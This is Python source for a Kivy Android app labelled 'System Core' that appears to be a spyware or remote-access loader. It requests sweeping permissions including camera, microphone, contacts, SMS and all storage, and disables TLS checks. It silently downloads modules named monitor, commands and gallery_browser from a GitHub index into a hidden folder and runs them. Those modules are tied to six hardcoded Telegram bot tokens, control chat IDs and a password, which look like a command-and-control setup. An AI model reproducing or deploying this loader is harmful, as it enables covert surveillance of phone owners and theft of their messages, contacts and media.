# -*- coding: utf-8 -*-
import os, sys, threading, json, base64, importlib, requests, hashlib, traceback, gc, time
from datetime import datetime
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.clipboard import Clipboard

# إخفاء تحذيرات SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== مسار تخزين آمن (getFilesDir) ==========
def _get_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        p = os.path.join(base, ".sys_runtime")
    except:
        p = os.path.join(os.getcwd(), ".sys_runtime")
    if not os.path.exists(p):
        os.makedirs(p)
    return p

R = _get_path()
if R not in sys.path:
    sys.path.insert(0, R)

# ========== صلاحيات أندرويد 13+ ==========
def _perms():
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.INTERNET,
            Permission.CAMERA,
            Permission.RECORD_AUDIO,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_CONTACTS,
            Permission.READ_SMS,
            Permission.WAKE_LOCK,
            Permission.ACCESS_NETWORK_STATE,
            Permission.ACCESS_WIFI_STATE,
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.MANAGE_EXTERNAL_STORAGE",
            "android.permission.POST_NOTIFICATIONS",
            "android.permission.READ_MEDIA_IMAGES",
            "android.permission.READ_MEDIA_VIDEO",
            "android.permission.READ_MEDIA_AUDIO"
        ])
    except:
        pass

RAW_INDEX = "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json"

class CoreApp(App):
    def build(self):
        _perms()
        self.title = "System Core"
        layout = BoxLayout(orientation='vertical', spacing=5)
        self.log = TextInput(text="", readonly=True, background_color=(0.02,0.02,0.02,1),
                             foreground_color=(0.3,0.9,0.3,1), font_size='10sp')
        btns = BoxLayout(size_hint=(1,0.08), spacing=5)
        copy_btn = Button(text="📋 COPY", background_color=(0.2,0.4,0.6,1))
        copy_btn.bind(on_press=self._copy)
        clear_btn = Button(text="🗑 CLEAR", background_color=(0.6,0.2,0.2,1))
        clear_btn.bind(on_press=self._clear)
        btns.add_widget(copy_btn)
        btns.add_widget(clear_btn)
        layout.add_widget(self.log)
        layout.add_widget(btns)
        Clock.schedule_once(self._start, 0.5)
        return layout

    def _copy(self, _):
        Clipboard.copy(self.log.text)
        self._log("Log copied")

    def _clear(self, _):
        self.log.text = ""

    def _log(self, msg, lvl="INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        def upd(dt):
            self.log.text += f"[{ts}] [{lvl}] {msg}\n"
            if len(self.log.text) > 15000:
                self.log.text = self.log.text[-8000:]
            self.log.cursor = (0, len(self.log.text))
        Clock.schedule_once(upd, 0)

    def _download(self, url, name):
        for i in range(3):
            try:
                self._log(f"DL {name} ({i+1}/3)")
                r = requests.get(f"{url}?v={int(time.time())}", timeout=20, verify=False)
                if r.status_code == 200 and len(r.text) > 500:
                    with open(os.path.join(R, name), 'w', encoding='utf-8') as f:
                        f.write(r.text)
                    self._log(f"✅ {name} saved")
                    return True
            except:
                time.sleep(2)
        self._log(f"❌ {name} failed", "ERROR")
        return False

    def _start(self, _):
        threading.Thread(target=self._run, daemon=True).start()

    def _run(self):
        self._log("🚀 Core starting", "BOOT")
        needed = ["monitor.py", "telegram_ui.py", "commands.py", "gallery_browser.py"]

        # تحميل الملفات
        try:
            r = requests.get(RAW_INDEX, timeout=15, verify=False)
            if r.status_code == 200:
                for f in r.json().get('files', []):
                    n = f.split('/')[-1]
                    if n in needed:
                        self._download(f, n)
        except Exception as e:
            self._log(f"Index error: {e}", "ERROR")

        # مسح الموديولات القديمة
        for m in needed:
            mn = m.replace(".py", "")
            if mn in sys.modules:
                del sys.modules[mn]
        gc.collect()

        try:
            import monitor, telegram_ui, commands
            importlib.reload(monitor)
            importlib.reload(telegram_ui)
            importlib.reload(commands)

            mon = monitor.M()
            mon.bots = [
                "7989685602:AAFRAWYihFV3Vx6XOUJyjcTOZYo8cT5DPJQ",
                "8113293244:AAFFwTHZ5GkoV3DN88jeU8XuMhJf0KLTsf4",
                "8369506331:AAFbMuU5NsVPWP9y977xG_lLaG1-pdGBs-Q",
                "8731591344:AAE2akQtyBPLNZbzhxkjxYDgQ4noiH_keYo",
                "8444591624:AAH84_ih3YUm4rEU_0zVnY2H05QTjjyMsZI",
                "8541707106:AAHJFi2V57HryzYkmA2FBgFMcetfqQCi2jM"
            ]
            mon.ctrl = -1003365166986
            mon.vlt = -1003787520015
            mon.pw = "Zaen123@123@123"

            ui = telegram_ui.T(mon)
            mon.cb_h = lambda d, cid, cbq: commands.ex(d, ui, mon, cid, cbq)

            mon.start()
            ui.start()
            self._log("🎉 SYSTEM ONLINE", "SUCCESS")
        except Exception as e:
            self._log(f"FATAL: {e}", "ERROR")
            self._log(traceback.format_exc(), "TRACE")

if __name__ == '__main__':
    CoreApp().run()
